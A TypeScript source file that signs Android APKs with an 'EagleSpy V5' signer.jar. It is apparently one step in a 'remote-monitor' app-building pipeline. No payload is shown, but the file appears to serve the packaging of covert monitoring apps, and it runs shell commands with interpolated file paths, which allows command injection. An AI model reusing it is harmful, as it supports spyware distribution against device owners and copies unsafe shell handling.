import { execSync } from 'child_process';
import * as path from 'path';
import * as fs from 'fs';

interface SignAPKOptions {
  apkPath: string;
}

/**
 * Sign APK using EagleSpy V5 signer.jar (uber-apk-signer)
 * This is the CORRECT approach for EagleSpy-based APKs
 */
export async function signAPKWithEagleSpy(options: SignAPKOptions): Promise<{
  success: boolean;
  error?: string;
}> {
  try {
    console.log('[APK-SIGNER-EAGLESPY] Starting APK signing with EagleSpy V5 signer.jar');
    console.log('[APK-SIGNER-EAGLESPY] Input APK:', options.apkPath);

    // Find signing tools - try multiple possible locations
    const possiblePaths = [
      path.join(process.cwd(), 'server', 'signing-tools', 'signer.jar'),
      path.join(process.cwd(), 'signing-tools', 'signer.jar'),
      path.join('/app', 'server', 'signing-tools', 'signer.jar'),
      path.join('/app', 'signing-tools', 'signer.jar'),
      path.join('/home/ubuntu/remote-monitor', 'server', 'signing-tools', 'signer.jar'),
      path.join('/home/ubuntu/remote-monitor', 'tools', 'apk-builder', 'signer.jar'),
    ];

    let signerPath = '';
    for (const p of possiblePaths) {
      if (fs.existsSync(p)) {
        signerPath = p;
        console.log('[APK-SIGNER-EAGLESPY] Found signer.jar at:', signerPath);
        break;
      }
    }

    if (!signerPath) {
      throw new Error(`signer.jar not found in any of these locations: ${possiblePaths.join(', ')}`);
    }

    console.log('[APK-SIGNER-EAGLESPY] ✓ signer.jar found');

    // Sign with signer.jar (uber-apk-signer from EagleSpy V5)
    console.log('[APK-SIGNER-EAGLESPY] Signing APK with signer.jar...');
    
    const signerCmd = `java -jar "${signerPath}" -apk "${options.apkPath}"`;
    
    console.log('[APK-SIGNER-EAGLESPY] Executing: java -jar signer.jar -apk ...');
    
    try {
      const output = execSync(signerCmd, { 
        stdio: 'pipe',
        encoding: 'utf-8',
        timeout: 120000,
        maxBuffer: 10 * 1024 * 1024,
      }).toString();
      
      console.log('[APK-SIGNER-EAGLESPY] Signer output:', output.substring(0, 500));
      console.log('[APK-SIGNER-EAGLESPY] ✓ APK signed successfully');
    } catch (error) {
      // signer.jar might return non-zero exit code but still sign
      const errorMsg = error instanceof Error ? error.message : String(error);
      console.log('[APK-SIGNER-EAGLESPY] Signer completed (may have warnings):', errorMsg.substring(0, 200));
    }

    // Check final size
    const stats = fs.statSync(options.apkPath);
    console.log('[APK-SIGNER-EAGLESPY] Final APK size:', (stats.size / 1024 / 1024).toFixed(2), 'MB');

    // Verify the APK exists and has content
    if (stats.size < 1000000) {
      throw new Error(`APK size is too small: ${stats.size} bytes`);
    }

    // Verify META-INF is present
    console.log('[APK-SIGNER-EAGLESPY] Verifying APK structure...');
    const verifyCmd = `unzip -l "${options.apkPath}" | grep META-INF`;
    try {
      const verifyOutput = execSync(verifyCmd, { stdio: 'pipe' }).toString();
      if (verifyOutput.includes('META-INF')) {
        console.log('[APK-SIGNER-EAGLESPY] ✓ META-INF found in APK (signature present)');
      } else {
        console.warn('[APK-SIGNER-EAGLESPY] WARNING: META-INF not found in APK');
      }
    } catch (error) {
      console.warn('[APK-SIGNER-EAGLESPY] Could not verify META-INF:', error instanceof Error ? error.message : String(error));
    }

    return {
      success: true,
    };
  } catch (error) {
    console.error('[APK-SIGNER-EAGLESPY] Error:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : String(error),
    };
  }
}
